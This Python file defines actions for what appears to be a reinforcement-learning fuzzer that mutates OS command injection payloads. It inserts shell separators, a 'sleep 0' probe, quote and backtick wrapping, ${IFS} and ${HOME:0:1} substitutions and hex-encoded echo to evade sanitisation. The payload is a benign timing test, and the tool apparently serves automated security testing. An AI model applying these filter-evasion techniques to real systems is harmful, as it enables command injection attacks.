import random
import string
from itertools import product
import torch

from Environment.Games import GAME

class Action:
    context_escape_tokens = [';', '&&', '||', '&', '|', '#']

    def __init__(self, actionTuple):
        self.actionId = actionTuple[0]
        self.location = actionTuple[1]
    
    def applyAction(self, payload):
        newPayload = list(payload)

        if self.actionId <= 5:
            # static = [';', '&&', '||', '&', '|', '#', Action.generateRandomString(letters=True), 
            #      Action.generateRandomString(numbers=True), Action.generateRandomString(letters=True, numbers=True, punctuation=True), 
            #      'sleep 0']
            charToInsert = Action.context_escape_tokens[self.actionId]
            newPayload.insert(self.location, charToInsert)
            return "".join(newPayload)
        
        if self.actionId == 6:
            newPayload.insert(self.location, "sleep 0")
            return "".join(newPayload)

        match self.actionId:
            case 7:
                newPayload = self.__insertDouble(newPayload, '\'')
            case 8:
                newPayload = self.__insertDouble(newPayload, '\"')
            case 9:
                newPayload = self.__insertDouble(newPayload, '`')
            case 10:
                s = ''.join(newPayload)
                newPayload = list(s.replace(" ", "${IFS}"))
            case 11: 
                # Should do this for any combination of caps in 'sleep 0'
                s = ''.join(newPayload)
                newPayload = list(s.replace("sleep 0", ' echo -e “\x73\x6C\x65\x65\x70\x20\x30"'))
            case 12: 
                # Should do this for any combination of caps in 'sleep 0'
                s = ''.join(newPayload)
                newPayload = list(s.replace("/", '${HOME:0:1}'))
            # Add a random slashes before chars
            # Syntax Fixing actions: 
            # case 13:
            #     newPayload.insert(self.location, "8.8.8.8")
            # case 14: 
            #     newPayload.insert(self.location, "randomFile.txt")
            # case 15: 
            #     newPayload.insert(self.location, "/random/dir")
            # case 16: 
            #     newPayload.insert(self.insert, Action.generateRandomString(length=3, numbers=True))
        return "".join(newPayload)
     
    def getActionTensor(self):
        return torch.tensor([self.actionId, self.location])
    
    def getAvailableActions(game, payload):
        n = len(payload)
        injLocs = list(range(0, n + 1)) if n != 0 else [0]
        match game:
            case GAME.CONTEXT_ESCAPE:
                validActions = list(range(0, 5 + 1))
            case GAME.BEHAVIOR_CHANGE:
                validActions = [6]
            case GAME.SANITISATION_ESCAPE:
                validActions = list(range(7, 12 + 1))
            case _ : 
                return []
        
        return [Action((a, l)) for a, l in product(validActions, injLocs)]


    def getActionId(self):
        return self.actionId

    def __insertDouble(self, payload, char, dist=2):
        payload.insert(self.location, char)
        payload.insert(self.location + dist, char)
        return payload
    
    def size():
        return 2

    def generateRandomString(length=10, letters=False, numbers=False, punctuation=False):
        characters = ''
        if letters: characters += string.ascii_letters
        if numbers: characters += string.digits
        if punctuation: characters += string.punctuation 

        assert(len(characters) > 0)
        random_string = ''.join(random.choice(characters) for _ in range(length))
        return random_string
